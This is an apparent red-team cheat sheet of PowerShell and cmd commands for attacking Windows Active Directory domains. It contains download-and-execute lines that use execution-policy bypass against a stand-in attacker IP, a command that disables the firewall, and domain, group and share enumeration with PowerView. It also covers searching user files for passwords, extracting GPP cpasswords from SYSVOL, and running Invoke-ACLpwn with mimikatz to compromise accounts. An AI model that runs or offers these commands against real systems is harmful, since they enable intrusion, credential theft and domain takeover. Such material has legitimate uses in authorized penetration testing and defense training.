## Downloading/ Uploading Files

Download a file to the current folder with the same name:

    Powershell.exe -nop -exec bypass -c "IEX (New-Object System.Net.WebClient).Downloadfile('http://10.10.10.10/file.txt');" 

Download to a specific folder and with a specific name as specified in the second argument of the DownloadFile function:

    Powershell.exe -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadFile('http://10.10.10.10/PowerView.ps1','C:\tmp\PowerView.ps1');" 


## Disable Firewall

    Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False

## Enumeration

### Enumerate Domain

    Get-NetDomain
    Get-NetDomain -Domain <DomainName>
    Get-DomainSID
    Get-Domain Policy

### Enumerate Domain Computers

    Get-NetComputer
    Get-NetComputer -FullData
    Get-NetComputer -OperatingSystem "*Server 2016*"
    Get-ADComputer (will list all computers within the domain)
    Get-NetComputer -Ping (Enumerate Live machines) 
    Get-DomainGroup

### Enumerate Service Accounts

    Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName

### Enumerate Groups

    Get-NetGroup
    Get-NetGroup -Domain <Target Domain>
    Get-NetGroup -Full Data
    Get-ADGroup -Filter * | select name
    Get-ADGroup -Filter * -Properties *
    Get-Netgroup -groupname *admin*
    Get-Netgroup 'Domain Admins' -FullData
    Get ADGroup -Filter 'Name -like "*admin*"' | select Name 

### Enumerate Shares
    
    Find-DomainShare 
    Find-DomainShare -CheckShareAccess

### Enumerate the Network

    set [Use SET to get domain information and username]
    net view [Use NET VIEW to get computers in the users domain and other domains]
    net view /domain [Use NET VIEW to get computers in other domains]
    net user [Use NET USER to get local users on the computer you are on]
    net user /domain [All users in the current user's domain]
    net localgroup [Use NET LOCALGROUP to get the local groups on the computer] 
    net localgroup /domain [Use NET LOCALGROUP to get the domain groups] 
    net localgroup administrators [All users in the local administrators group]
    net localgroup administrators /domain [All users in the domain administrators group]
    net group "Company Admins" /domain [All users in the "Company Admins" group]
    net user "wesley.pipes" /domain [All info about this user]
    nltest /dclist: [List Domain Controllers]

### Enumerate Computer Files

Locate files with "password" in the name within C:\Users

    Get-ChildItem -Recurse -Path "C:\Users" -File | ? { $_.Name -match "password" } -ErrorAction SilentlyContinue 

Locate files with the .TXT extension within C:\Users 

    Get-ChildItem -Recurse -Path "C:\Users" -File | ? { $_.Name -like "*.txt" } -ErrorAction SilentlyContinue 

Enumerate files in C:\Users recursively, excluding EXE, MSI, DLL to return files that contain the string/partial string "user" and/or "pass" (will pick up "bypass", change "pass" to "password" to limit matches). Remove "| Select Path" to view the lines themselves within each file that the pattern appears on instead of the file's location 

    GCI -Recurse -Path "C:\Users\" -File | ? { ($_.Name -notlike "*.exe") -and ($_.Name -notlike "*.msi") -and ($_.Name -notlike "*.dll") } | Select-String -pattern user,pass | Select Path -ErrorAction SilentlyContinue 

Recursively enumerates all TXT files and displays the content lines within the files that match the pattern "user" and/or "pass"

    GCI -Recurse -Path "C:\Users" -File | ? { $_.Name -like "*.txt" } | Select-String user,pass

### Find GPP Passwords in SYSVOL

    findstr /S cpassword $env:logonserver\sysvol\*.xml
    findstr /S cpassword %logonserver%\sysvol\*.xml (cmd.exe)

### ADACLScanner

A tool with GUI used to create reports of access control lists (DACLs) and system access control lists (SACLs) in Active Directory.  
Run effective rights report from the command line. Parameter from command line to get modified date of security descriptor in report. 

    .\ADACLScan.ps1 -Base "dc=target,dc=domain" -AccessType Allow -ApplyTo user -Permission "WriteProperty|GenericAll"

Reference: https://github.com/canix1/ADACLScanner

### Invoke-ACLpwn

Invoke-ACLpwn is a tool that automates the discovery and pwnage of ACLs in Active Directory that are unsafe configured.

    ./Invoke-ACL.ps1 -SharpHoundLocation .\sharphound.exe -NoDCSync
    ./Invoke-ACL.ps1 -SharpHoundLocation .\sharphound.exe -mimiKatzLocation .\mimikatz.exe
    ./Invoke-ACL.ps1 -SharpHoundLocation .\sharphound.exe -mimiKatzLocation .\mimikatz.exe -userAccountToPwn 'Administrator'
    ./Invoke-ACL.ps1 -SharpHoundLocation .\sharphound.exe -mimiKatzLocation .\mimikatz.exe -LogToFile
    ./Invoke-ACL.ps1 -SharpHoundLocation .\sharphound.exe -mimiKatzLocation .\mimikatz.exe -NoSecCleanup
    ./Invoke-ACL.ps1 -SharpHoundLocation .\sharphound.exe -mimiKatzLocation .\mimikatz.exe -Username 'testuser' -Domain 'xenoflux.local' -Password 'Welcome01!'

Reference: https://github.com/fox-it/Invoke-ACLPwn

### PowerView

PowerView is a PowerShell tool to gain network situational awareness on Windows domains. It contains a set of pure-PowerShell replacements for various windows "net *" commands, which utilize PowerShell AD hooks and underlying Win32 API functions to perform useful Windows domain functionality.

To install this module, drop the entire Recon folder into one of your module directories. The default PowerShell module paths are listed in the $Env:PSModulePath environment variable.

The default per-user module path is: 

    "$Env:HomeDrive$Env:HOMEPATH\Documents\WindowsPowerShell\Modules"
The default computer-level module path is: 

    "$Env:windir\System32\WindowsPowerShell\v1.0\Modules"

To use the module:

    Import-Module Recon

To see the commands imported: 

    Get-Command -Module Recon

Reference: https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon
